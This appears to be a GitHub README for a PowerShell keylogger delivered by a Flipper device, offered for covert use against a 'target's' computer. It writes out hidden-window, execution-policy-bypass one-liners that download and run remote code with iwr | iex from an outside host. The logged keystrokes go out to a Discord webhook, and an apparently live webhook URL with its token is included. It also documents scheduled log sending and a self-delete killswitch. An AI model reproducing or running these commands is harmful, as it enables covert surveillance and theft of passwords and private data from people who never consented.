
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Keylogger 

This is a Powershell based keylogger that exfiltrates the logs to discord

## Description

Quickly with just ONE line of code you can deploy a keylogger on your targets computer 

Complete with custom logging times, and self destruct feature

Just move the `keylogger.txt` file over to your flipper and you are good to go

## Getting Started

### Dependencies

* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* 15 seconds later you have their keystrokes being sent to you

This is the basic command to install the keylogger and provide the webhook for the keystrokes to be sent back to you

* `$dc=''` is the variable where you plug in your discord webhook 

```
powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1092997498089521183/ZzWeOZRzAfNWtqXfzLDv47DMWokwf-yMbhL-px977t0sqqTGDuT9YmI27cIKRrxF9Tza';iwr "https://jakoby.lol/m2m" | iex
```
### ADDITIONAL PARAMETERS

The payload is set to send the logs collected every hour on the hour

* You maybe use the `$log` variable to specify a certain time instead (Use this for testing)
* ex: `$log="09:00 pm"`  <-- This will send the log every night at 9pm

You also have the option of setting up a killswitch to have the keylogger self delete at a certain time and date 

`$ks="12/25/2022 10:00:00 PM"`  <-- This will make the keylogger self delete at 10pm on December 25th

Calling the script with both a `log` time and `killswitch` will look something like this: 
 
```
powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='09:00 pm';$ks='12/25/2022 10:00:00 PM';iwr 'https://jakoby.lol/m2m' | iex"
```
### DELETING THE KEYLOGGER

Just hold `Left Control` + `Right Control` for 5 seconds untill the notification box pops up

<img src= https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/keylogger/kkl.png width="400" alt="C#" />



<p align="right">(<a href="#top">back to top</a>)</p>

